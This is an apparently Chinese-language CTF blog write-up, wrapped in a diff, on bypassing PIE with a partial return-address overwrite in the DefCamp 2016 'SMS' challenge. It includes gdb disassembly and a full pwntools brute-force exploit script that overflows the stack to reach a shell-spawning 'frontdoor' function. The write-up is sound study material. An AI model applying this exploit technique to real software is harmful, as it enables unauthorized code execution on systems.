@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言最近了解完 PIE 与 ASLR 的关系后，对这方面的 bypass 很感兴趣，搜到了很多相关文章，其中 CTF必备技能丨Linux Pwn入门教程——PIE与bypass思路 这一篇很详细，也例举了各个类型的题目，此篇文章是对文章中第一种 bypass 方式的理解&amp;amp;做题过程，题目为：DefCamp CTF Finals 2016-SMS PIE 会让虚拟地址页随机化，已知一">
+<meta name="keywords" content="learn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PIE BYPASS 1-partial write">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;25&#x2F;PIE-BYPASS-1-partial-write&#x2F;index.html">
+<meta property="og:site_name" content="zndetcl blog">
+<meta property="og:description" content="0x00 前言最近了解完 PIE 与 ASLR 的关系后，对这方面的 bypass 很感兴趣，搜到了很多相关文章，其中 CTF必备技能丨Linux Pwn入门教程——PIE与bypass思路 这一篇很详细，也例举了各个类型的题目，此篇文章是对文章中第一种 bypass 方式的理解&amp;amp;做题过程，题目为：DefCamp CTF Finals 2016-SMS PIE 会让虚拟地址页随机化，已知一">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20191225182611514.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20191225182655492.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20191225182803797.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20191225182834906.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20191225183852390.png">
+<meta property="og:updated_time" content="2019-12-26T01:33:02.518Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20191225182611514.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>PIE BYPASS 1-partial write</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/01/05/PIE-BYPASS-2-vsyscall/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/12/23/PIE-ASLR/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&text=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&is_video=false&description=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PIE BYPASS 1-partial write&body=Check out this article: http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&name=PIE BYPASS 1-partial write&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&t=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常用命令"><span class="toc-number">2.</span> <span class="toc-text">0x01 常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-流程分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用分析"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-poc"><span class="toc-number">5.</span> <span class="toc-text">0x04 poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-总结"><span class="toc-number">6.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PIE BYPASS 1-partial write
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">zndetcl blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-25T09:41:04.000Z" itemprop="datePublished">2019-12-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/binary/">binary</a> › <a class="category-link" href="/categories/binary/ctf/">ctf</a> › <a class="category-link" href="/categories/binary/ctf/linux/">linux</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近了解完 PIE 与 ASLR 的关系后，对这方面的 bypass 很感兴趣，搜到了很多相关文章，其中 <a href="https://www.cnblogs.com/ichunqiu/p/11350476.html" target="_blank" rel="noopener">CTF必备技能丨Linux Pwn入门教程——PIE与bypass思路</a> 这一篇很详细，也例举了各个类型的题目，此篇文章是对文章中第一种 bypass 方式的理解&amp;做题过程，题目为：DefCamp CTF Finals 2016-SMS</p>
+<p><strong>PIE 会让虚拟地址页随机化，已知一页 = 4096 位 = 0x1000 ，那么意味着被随机化的地址最后3个 bit 是不变的</strong>，也就是一页中的数据，它们的<strong>相对位置不变</strong></p>
+<p>在实际利用过程中，大多数时候只能以最小单位 byte 的形式写入到程序内存中，要么写入一个字节，要么两个字节，0xXX 或 0xXXXX，具体写入内容需要根据具体遇见的情况作出判断，当然写入越少越好 – 这种方式被称为 <strong>partial write</strong></p>
+<h2 id="0x01-常用命令"><a href="#0x01-常用命令" class="headerlink" title="0x01 常用命令"></a>0x01 常用命令</h2><p>无奈没装 IDA ，虽然不太方便，但是 gdb 挺好用的</p>
+<p>拿到 elf 文件，没源码很无奈</p>
+<p><code>ldd</code> 查看运行所需的共享库，如下</p>
+<pre><code class="bash">$ ldd 200_2016.bin 
+    linux-vdso.so.1 (0x00007ffe3f658000)
+    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe9ff718000)
+    /lib64/ld-linux-x86-64.so.2 (0x00005606e0853000)</code></pre>
+<p>第一列：程序需要依赖什么库<br>第二列: 系统提供的与程序需要的库所对应的库<br>第三列：库加载的开始地址</p>
+<p><code>gdb -q ./200_2016.bin</code> 进去 run 一下，然后看函数信息 <code>info functions</code> ，输出如下</p>
+<pre><code class="text">Non-debugging symbols:
+0x0000555555554720  _init
+0x0000555555554750  strncpy@plt
+0x0000555555554760  puts@plt
+0x0000555555554770  system@plt
+0x0000555555554780  printf@plt
+0x0000555555554790  memset@plt
+0x00005555555547a0  __libc_start_main@plt
+0x00005555555547b0  fgets@plt
+0x00005555555547c0  __gmon_start__@plt
+0x00005555555547c8  __cxa_finalize@plt
+0x00005555555547d0  _start
+0x0000555555554800  deregister_tm_clones
+0x0000555555554840  register_tm_clones
+0x0000555555554890  __do_global_dtors_aux
+0x00005555555548d0  frame_dummy
+0x0000555555554900  frontdoor
+0x000055555555492f  dosms
+0x000055555555498d  set_sms
+0x0000555555554a1c  set_user
+0x0000555555554ae7  main
+0x0000555555554b20  __libc_csu_init
+0x0000555555554b90  __libc_csu_fini
+0x0000555555554b94  _fini
+0x00007ffff7dd5e90  _dl_catch_exception@plt
+0x00007ffff7dd5ea0  malloc@plt
+0x00007ffff7dd5eb0  _dl_signal_exception@plt
+0x00007ffff7dd5ec0  calloc@plt
+0x00007ffff7dd5ed0  realloc@plt
+0x00007ffff7dd5ee0  _dl_signal_error@plt
+0x00007ffff7dd5ef0  _dl_catch_error@plt
+0x00007ffff7dd5f00  free@plt
+0x00007ffff7ffaa60  __vdso_clock_gettime
+0x00007ffff7ffaa60  clock_gettime
+0x00007ffff7fface0  __vdso_gettimeofday
+0x00007ffff7fface0  gettimeofday
+0x00007ffff7ffae50  __vdso_time
+0x00007ffff7ffae50  time
+0x00007ffff7ffae70  __vdso_getcpu
+0x00007ffff7ffae70  getcpu
+[...]
+0x00007ffff7a050a0  memalign@plt
+[...]
+0x00007ffff7a051e0  calloc@plt
+[...]
+0x00007ffff7a052c0  malloc@plt
+0x00007ffff7a052c8  free@plt
+</code></pre>
+<p>如上，会列出很多很多的函数以及映射地址，省略了大部分，能够在 Non-debugging symbols 部分看见一些程序自己的函数，如 main 函数</p>
+<pre><code class="text">0x0000555555554900  frontdoor
+0x000055555555492f  dosms
+0x000055555555498d  set_sms
+0x0000555555554a1c  set_user
+0x0000555555554ae7  main</code></pre>
+<p>如上就是程序自己的函数</p>
+<p><code>info functions</code> 该命令还可以接第二个参数进行正则过滤，如 <code>info functions front*</code> ，输出如下</p>
+<pre><code class="bash">(gdb) info functions front*    
+All functions matching regular expression &quot;front*&quot;:
+
+Non-debugging symbols:
+0x0000555555554900  frontdoor</code></pre>
+<p>gdb 是有反汇编功能的，虽然不如 IDA F5 那么好看，勉强能看吧23333</p>
+<p><code>disassemble</code> 命令，后面可以接函数名，也可以输入一段地址(以 <code>开始地址,结束地址</code> 形式传入)，对应的会反汇编出函数体 &amp; 一段地址的反汇编</p>
+<p> <code>set</code> 命令可以修改内存，直接 <code>set *addr</code> 即可</p>
+<p>因为 PIE 导致地址随机化不方便调试的话，在 gdb 中关闭随机地址即可: <code>set disable-randomization on</code></p>
+<p>一些更基础的调试命令随便网上找找就好了</p>
+<h2 id="0x02-流程分析"><a href="#0x02-流程分析" class="headerlink" title="0x02 流程分析"></a>0x02 流程分析</h2><p>进入正题，首先跑一跑程序，熟悉下情况</p>
+<pre><code class="bash">$ ./200_2016.bin 
+--------------------------------------------
+|   Welcome to Defcamp SMS service          |
+--------------------------------------------
+Enter your name
+&gt; 1
+Hi, 1
+SMS our leader
+&gt; 2
+SMS delivered</code></pre>
+<p>能看出来接受了2次输入，含有3次输出</p>
+<p>直接用 gdb 反编译一下 mian 函数，如下</p>
+<pre><code class="bash">(gdb) disassemble main             
+Dump of assembler code for function main:
+   0x0000555555554ae7 &lt;+0&gt;:    push   rbp
+   0x0000555555554ae8 &lt;+1&gt;:    mov    rbp,rsp
+   0x0000555555554aeb &lt;+4&gt;:    sub    rsp,0x10
+   0x0000555555554aef &lt;+8&gt;:    mov    DWORD PTR [rbp-0x4],edi
+   0x0000555555554af2 &lt;+11&gt;:    mov    QWORD PTR [rbp-0x10],rsi
+   0x0000555555554af6 &lt;+15&gt;:    lea    rdi,[rip+0xe3]        # 0x555555554be0
+   0x0000555555554afd &lt;+22&gt;:    call   0x555555554760 &lt;puts@plt&gt;
+   0x0000555555554b02 &lt;+27&gt;:    mov    eax,0x0
+   0x0000555555554b07 &lt;+32&gt;:    call   0x55555555492f &lt;dosms&gt;
+   0x0000555555554b0c &lt;+37&gt;:    mov    eax,0x0
+   0x0000555555554b11 &lt;+42&gt;:    leave  
+   0x0000555555554b12 &lt;+43&gt;:    ret    </code></pre>
+<p>如上，没啥特别的，调用了 dosms，应该这里就是主要逻辑函数了，反编译 dosms 如下</p>
+<pre><code class="bash">(gdb) disassemble dosms 
+Dump of assembler code for function dosms:
+   0x000055555555492f &lt;+0&gt;:    push   rbp
+   0x0000555555554930 &lt;+1&gt;:    mov    rbp,rsp
+   0x0000555555554933 &lt;+4&gt;:    sub    rsp,0xc0
+   0x000055555555493a &lt;+11&gt;:    lea    rax,[rbp-0xc0]
+   0x0000555555554941 &lt;+18&gt;:    add    rax,0x8c
+   0x0000555555554947 &lt;+24&gt;:    mov    edx,0x28
+   0x000055555555494c &lt;+29&gt;:    mov    esi,0x0
+   0x0000555555554951 &lt;+34&gt;:    mov    rdi,rax
+   0x0000555555554954 &lt;+37&gt;:    call   0x555555554790 &lt;memset@plt&gt;
+   0x0000555555554959 &lt;+42&gt;:    mov    DWORD PTR [rbp-0xc],0x8c
+   0x0000555555554960 &lt;+49&gt;:    lea    rax,[rbp-0xc0]
+   0x0000555555554967 &lt;+56&gt;:    mov    rdi,rax
+   0x000055555555496a &lt;+59&gt;:    call   0x555555554a1c &lt;set_user&gt;
+   0x000055555555496f &lt;+64&gt;:    lea    rax,[rbp-0xc0]
+   0x0000555555554976 &lt;+71&gt;:    mov    rdi,rax
+   0x0000555555554979 &lt;+74&gt;:    call   0x55555555498d &lt;set_sms&gt;
+   0x000055555555497e &lt;+79&gt;:    lea    rdi,[rip+0x223]        # 0x555555554ba8
+   0x0000555555554985 &lt;+86&gt;:    call   0x555555554760 &lt;puts@plt&gt;
+   0x000055555555498a &lt;+91&gt;:    nop
+   0x000055555555498b &lt;+92&gt;:    leave  
+   0x000055555555498c &lt;+93&gt;:    ret    
+End of assembler dump.
+</code></pre>
+<p>对应刚刚的程序运行情况，不难揣测第一次输入的 uname 就是在 set_user 函数中处理的，第二次输入的 msg 就是在 set_sms 中处理的，这俩函数反汇编看的蛋疼，借一下博文中的图片，如下</p>
+<p>dosms 函数</p>
+<p><img src="/.com//image-20191225182611514.png" alt="image-20191225182611514"></p>
+<p>set_user 函数</p>
+<p><img src="/.com//image-20191225182655492.png" alt="image-20191225182655492"></p>
+<p>set_sms 函数</p>
+<p><img src="/.com//image-20191225182803797.png" alt="image-20191225182803797"></p>
+<p>还有个 frontdoor 函数</p>
+<p><img src="/.com//image-20191225182834906.png" alt="image-20191225182834906"></p>
+<h2 id="0x03-利用分析"><a href="#0x03-利用分析" class="headerlink" title="0x03 利用分析"></a>0x03 利用分析</h2><p>在清楚了流程之后，我们现在肯定要利用这个 frontdoor 函数去 getshell ，那么怎么做呢</p>
+<p>理一理整个调用流程</p>
+<p>main -&gt; dosms -&gt; set_user -&gt; set_sms</p>
+<p>其中所有的 printf 都没法利用，就莫得格式化字符串漏洞了，这个时候我们 checksec 一下</p>
+<pre><code class="text">[*] &#39;/pwn/DefCamp-CTF-Finals/200_2016.bin&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+<p>诶栈保护没开，那估计可以搞返回地址，仔细读一读程序代码</p>
+<p>最后 set_sms 函数中，控制 strncpy 函数复制字节数的第三参数是 <code>*(_DWORD *)(a1 + 180)</code> ，这个 a1 地址是在 dosms 函数中传递过来的，注意到该地址还传递给了 set_user 函数，仔细看看 set_user 函数的 for 循环，对该地址进行了写入操作，下图</p>
+<p><img src="/.com//image-20191225183852390.png" alt="image-20191225183852390"></p>
+<p>当 i == 40 时 s[40] 不为空的情况下，会对 <code>a1 + 40 + 140</code> 这个地址写入一个字节，值为 s[40] <strong>(最大为 0xff)</strong></p>
+<p>这就明了了，我们可以通过构造，写入 41 字节的 uname ，其中最后一个字节值将会作为 strncpy 函数操作的字符个数</p>
+<p>现在再仔细看看 set_sms 函数中调用的 strncpy 函数，第一位参数是 a1 ，这意味着从 s 地址读取的数据全部写入到了 dosms 函数中的以 v1 为开始地址的空间中，v1 地址恰好在栈中，那么简而言之就是我们可以写入最大 0xff 个字符到栈中，这里看一下 v1 地址到 rbp 的距离</p>
+<pre><code class="text">Dump of assembler code for function dosms:
+   0x000055555555492f &lt;+0&gt;:    push   rbp
+   0x0000555555554930 &lt;+1&gt;:    mov    rbp,rsp
+   0x0000555555554933 &lt;+4&gt;:    sub    rsp,0xc0</code></pre>
+<p>0xc0 == 192，那么覆盖 dosms 的返回地址只需要 192 + 8 + 8 = 208 个字节，这里小于我们能够写入的最大数量 0xff ，所以现在可以开始构造了 (填充满 v1 地址和 old rbp 只需要 192 + 8 = 200 字节)</p>
+<p>由于开启了 PIE ，所以精确覆盖 dosms 的返回地址是不是不太可能了?</p>
+<p>在 dosms 入口处打断点，查看调试信息</p>
+<pre><code class="bash">(gdb) x/10gx $rsp
+0x7fffffffe5f0:    0x00007fffffffe610    0x0000555555554b0c
+0x7fffffffe600:    0x00007fffffffe6f8    0x0000000100000000
+0x7fffffffe610:    0x0000555555554b20    0x00007ffff7a05b97
+0x7fffffffe620:    0x0000000000000000    0x00007fffffffe6f8
+0x7fffffffe630:    0x0000000100000000    0x0000555555554ae7
+// 查看一下现在的 $rbp
+(gdb) x/gx $rbp
+0x7fffffffe5f0:    0x00007fffffffe610
+// 查看一下 frontdoor 地址
+(gdb) p frontdoor 
+$20 = {&lt;text variable, no debug info&gt;} 0x555555554900 &lt;frontdoor&gt;</code></pre>
+<p>如上，按理说 dosms 的返回地址在 0x7fffffffe5f8 -&gt; 0x0000555555554b0c ，注意观察到 frontdoor 地址为 0x555555554900，dosms 返回地址与 frontdoor 地址只是在低地址有所差别，仅 3 个 bit</p>
+<p>那么我们可以写入 4 bit (两个字节) 去碰碰运气，还是不能百分百准确的一次命中</p>
+<p>因为假如写入的是 0x0900 ，那么会有一定的机会碰到页地址随机为 0x555555550 这样的情况，其实会有 16 种可能的情况: 0x0900 , 0x1900, 0x2900…….0xf900</p>
+<p>现在目标明确了，填充数据也已经计算好了</p>
+<p>uname 写入 40 + 1 个字节</p>
+<p>msg 写入 192 + 8 + 2 = 202 个字节</p>
+<p>由于 msg 确定了，所以我们需要 uname 的最后一位写入 202 的值，也就是 0xca</p>
+<p>最终:</p>
+<p>uname -&gt; <code>&quot;A&quot;*40 + &quot;\x0ca&quot;</code></p>
+<p>msg -&gt; <code>&quot;B&quot;*200 + &quot;\x00\x19&quot;</code> # \x19 可以改成其他的 \x29 等等</p>
+<h2 id="0x04-poc"><a href="#0x04-poc" class="headerlink" title="0x04 poc"></a>0x04 poc</h2><p>上文中将两次输入数据已经计算好了，现在开始尝试编写利用脚本</p>
+<pre><code class="python">#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+#context.log_level = &quot;debug&quot;
+low_addr = 0x2901 # not 0x2900
+
+username = &quot;A&quot;*40 + &quot;\xca&quot;
+padding = &quot;B&quot;*0xc8
+count = 0
+
+while True:
+    prog = process(&quot;./200_2016.bin&quot;)
+    prog.recv()
+    prog.sendline(username)
+    prog.recv()
+    prog.sendline(padding + p64(low_addr))
+    prog.recv()
+    try:
+        prog.recv(timeout = 1)
+    except EOFError:
+        print &#39;go on&#39;
+        prog.close()
+        count+=1
+        continue
+    else:
+        count+=1
+        print &quot;success, total: &quot; + str(count)
+        sleep(0.1)  
+        prog.sendline(&quot;/bin/sh\x00&quot;)
+        sleep(0.1)
+        prog.interactive()
+        break</code></pre>
+<p>第一次尝试写，写的有点丑23333</p>
+<p>结构很简单，因为 PIE 导致的随机地址，所以需要爆破，循环的次数嘛-就看脸了</p>
+<p>代码中爆破的3位低地址是 0x901 ，这里改了 00 为 01，在调试的过程中发现，如果直接跳到 frontdoor 入口(0x900)，会有一个 push rbp 的动作，此时的 rbp 是已经被污染的 “BBBBBBBB” ，不知道发生了什么在后续调用 system 函数的时候并没有拿到 shell，但是如果从 0x901 地址过去，没有 push 操作，后续的 system 函数调用也可以直接拿到 shell …….可能是污染的数据干扰到了 system 函数的调用吧emmm</p>
+<p>好像 <code>prog.recve()</code> 这个调用只要是没有出现异常都能正常返回？不太清楚，还没有认真看过 pwntools 用法</p>
+<p>这里的 try-catch 代码块是为了检测进程是否 segment fault，如果没有猜对地址，那肯定会抛异常，这样就可以进入下一次循环</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>partial write 这种 bypass 的方式呢，主要是利用同页数据相对位置不变，所以能够很快的爆破出真实地址</p>
+<p>另外太菜了，搞了近1天才弄完题目</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常用命令"><span class="toc-number">2.</span> <span class="toc-text">0x01 常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-流程分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用分析"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-poc"><span class="toc-number">5.</span> <span class="toc-text">0x04 poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-总结"><span class="toc-number">6.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&text=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&is_video=false&description=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PIE BYPASS 1-partial write&body=Check out this article: http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&title=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&name=PIE BYPASS 1-partial write&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2019/12/25/PIE-BYPASS-1-partial-write/&t=PIE BYPASS 1-partial write" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 zndetcl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
